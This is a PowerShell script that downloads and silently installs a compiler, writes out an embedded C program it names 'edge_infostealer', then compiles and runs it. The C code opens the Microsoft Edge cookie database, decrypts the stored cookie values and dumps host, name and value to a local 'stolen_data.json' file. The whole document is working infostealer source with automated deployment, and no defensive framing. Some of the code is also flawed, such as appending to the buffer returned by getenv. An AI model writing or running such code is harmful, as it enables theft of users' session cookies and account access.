# Define the URL for w64devkit
$w64devkitUrl = "https://github.com/skeeto/w64devkit/releases/download/v2.0.0/w64devkit-x86-2.0.0.exe"
$w64devkitExe = "w64devkit-x86-2.0.0.exe"
$w64devkitDir = "w64devkit"

# Download w64devkit
Invoke-WebRequest -Uri $w64devkitUrl -OutFile $w64devkitExe

# Run the w64devkit installer
Start-Process -FilePath $w64devkitExe -ArgumentList "/SILENT" -Wait

# Define the C program
$cProgram = @"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wincrypt.h>
#include <sqlite3.h>

#pragma comment(lib, "crypt32.lib")

char* decrypt_edge_data(const unsigned char* encrypted_value, int encrypted_len) {
    DATA_BLOB DataIn;
    DATA_BLOB DataOut;
    char* decrypted_value = NULL;

    DataIn.pbData = (BYTE*)encrypted_value;
    DataIn.cbData = encrypted_len;

    if (CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, 0, &DataOut)) {
        decrypted_value = (char*)malloc(DataOut.cbData + 1);
        memcpy(decrypted_value, DataOut.pbData, DataOut.cbData);
        decrypted_value[DataOut.cbData] = '\0';
        LocalFree(DataOut.pbData);
    }

    return decrypted_value;
}

void get_edge_cookies() {
    sqlite3* db;
    sqlite3_stmt* stmt;
    const char* db_path = getenv("LOCALAPPDATA");
    strcat(db_path, "\\Microsoft\\Edge\\User Data\\Default\\Cookies");
    const char* sql = "SELECT host_key, name, encrypted_value FROM cookies";

    if (sqlite3_open(db_path, &db) == SQLITE_OK) {
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            FILE* file = fopen("stolen_data.json", "w");
            if (file) {
                fprintf(file, "[\n");
                int first = 1;
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    const char* host_key = (const char*)sqlite3_column_text(stmt, 0);
                    const char* name = (const char*)sqlite3_column_text(stmt, 1);
                    const unsigned char* encrypted_value = (const unsigned char*)sqlite3_column_blob(stmt, 2);
                    int encrypted_len = sqlite3_column_bytes(stmt, 2);

                    char* decrypted_value = decrypt_edge_data(encrypted_value, encrypted_len);
                    if (decrypted_value) {
                        if (!first) {
                            fprintf(file, ",\n");
                        }
                        first = 0;
                        fprintf(file, "  {\n    \"host\": \"%s\",\n    \"name\": \"%s\",\n    \"value\": \"%s\"\n  }", host_key, name, decrypted_value);
                        free(decrypted_value);
                    }
                }
                fprintf(file, "\n]\n");
                fclose(file);
                printf("Data saved locally at stolen_data.json\n");
            }
            sqlite3_finalize(stmt);
        }
        sqlite3_close(db);
    }
}

int main() {
    get_edge_cookies();
    return 0;
}
"@

# Save the C program to a file
$cProgramPath = "edge_infostealer.c"
Set-Content -Path $cProgramPath -Value $cProgram

# Compile the C program using w64devkit
$w64devkitBin = "C:\w64devkit\bin"
$gccPath = Join-Path -Path $w64devkitBin -ChildPath "gcc.exe"
$compileCommand = "$gccPath edge_infostealer.c -o edge_infostealer -lcrypt32 -lsqlite3"
Invoke-Expression $compileCommand

# Run the compiled executable
$exePath = ".\edge_infostealer.exe"
Invoke-Expression $exePath
